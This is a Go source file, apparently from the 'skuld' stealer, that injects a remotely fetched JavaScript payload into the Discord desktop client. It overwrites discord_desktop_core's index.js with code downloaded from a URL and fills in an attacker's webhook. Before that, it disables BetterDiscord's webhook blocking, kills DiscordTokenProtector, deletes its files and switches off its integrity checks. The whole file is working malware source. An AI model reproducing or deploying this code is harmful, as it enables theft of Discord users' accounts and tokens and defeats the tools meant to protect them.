package discordinjection

import (
	"bufio"
	"bytes"
	"errors"
	"io"
	"net/http"
	"os"
	"path/filepath"
	"strings"

	"golang.org/x/text/encoding/charmap"

	"encoding/json"

	"github.com/hackirby/skuld/utils/hardware"
	"github.com/shirou/gopsutil/v3/process"
)

func Run(injection_url string, webhook string) {
	for _, user := range hardware.GetUsers() {
		BypassBetterDiscord(user)
		BypassTokenProtector(user)
		for _, dir := range []string{
			filepath.Join(user, "AppData", "Local", "discord"),
			filepath.Join(user, "AppData", "Local", "discordcanary"),
			filepath.Join(user, "AppData", "Local", "discordptb"),
			filepath.Join(user, "AppData", "Local", "discorddevelopment"),
		} {
			InjectDiscord(dir, injection_url, webhook)
		}
	}
}

func InjectDiscord(dir string, injection_url string, webhook string) error {
	files, err := filepath.Glob(filepath.Join(dir, "app-*", "modules", "discord_desktop_core-*", "discord_desktop_core"))
	if err != nil {
		return err
	}
	if len(files) == 0 {
		return errors.New("no discord_desktop_core found")
	}

	core := files[0]

	os.MkdirAll(filepath.Join(core, "initiation"), os.ModePerm)

	resp, err := http.Get(injection_url)
	if err != nil {
		return err
	}
	defer resp.Body.Close()

	body, err := io.ReadAll(resp.Body)
	if err != nil {
		return err
	}

	if !bytes.Contains(body, []byte("core.asar")) {
		return errors.New("core.asar not in body")
	}

	body = bytes.Replace(body, []byte("%WEBHOOK%"), []byte(webhook), 1)

	err = os.WriteFile(filepath.Join(core, "index.js"), body, 0644)
	if err != nil {
		return err
	}

	return nil
}

func BypassBetterDiscord(user string) error {
	bd := filepath.Join(user, "AppData", "Roaming", "BetterDiscord", "data", "betterdiscord.asar")
	f, err := os.Open(bd)
	if err != nil {
		return err
	}
	defer f.Close()

	r := bufio.NewReader(f)
	decoder := charmap.CodePage437.NewDecoder()
	decodedReader := decoder.Reader(r)

	txt, err := io.ReadAll(decodedReader)
	if err != nil {
		return err
	}

	f, err = os.Create(bd)
	if err != nil {
		return err
	}
	defer f.Close()

	w := bufio.NewWriter(f)
	encoder := charmap.CodePage437.NewEncoder()
	encodedWriter := encoder.Writer(w)

	_, err = encodedWriter.Write(bytes.ReplaceAll(txt, []byte("api/webhooks"), []byte("ByHackirby")))
	if err != nil {
		return err
	}
	err = w.Flush()
	if err != nil {
		return err
	}

	return nil
}

func BypassTokenProtector(user string) error {
	path := filepath.Join(user, "AppData", "Roaming", "DiscordTokenProtector")
	config := path + "\\config.json"

	processes, _ := process.Processes()

	for _, p := range processes {
		name, _ := p.Name()
		if strings.Contains(strings.ToLower(name), "discordtokenprotector") {
			p.Kill()
		}
	}

	for _, i := range []string{"DiscordTokenProtector.exe", "ProtectionPayload.dll", "secure.dat"} {
		_ = os.Remove(path + "\\" + i)
	}
	if _, err := os.Stat(config); os.IsNotExist(err) {
		return nil
	}

	file, err := os.Open(config)
	if err != nil {
		return err
	}
	defer file.Close()

	var item map[string]interface{}
	if err := json.NewDecoder(file).Decode(&item); err != nil {
		return err
	}
	item["auto_start"] = false
	item["auto_start_discord"] = false
	item["integrity"] = false
	item["integrity_allowbetterdiscord"] = false
	item["integrity_checkexecutable"] = false
	item["integrity_checkhash"] = false
	item["integrity_checkmodule"] = false
	item["integrity_checkscripts"] = false
	item["integrity_checkresource"] = false
	item["integrity_redownloadhashes"] = false
	item["iterations_iv"] = 364
	item["iterations_key"] = 457
	item["version"] = 69420

	file, err = os.Create(config)
	if err != nil {
		return err
	}
	defer file.Close()

	encoder := json.NewEncoder(file)
	encoder.SetIndent("", "  ")
	encoder.SetEscapeHTML(false)
	if err := encoder.Encode(&item); err != nil {
		return err
	}

	return nil
}
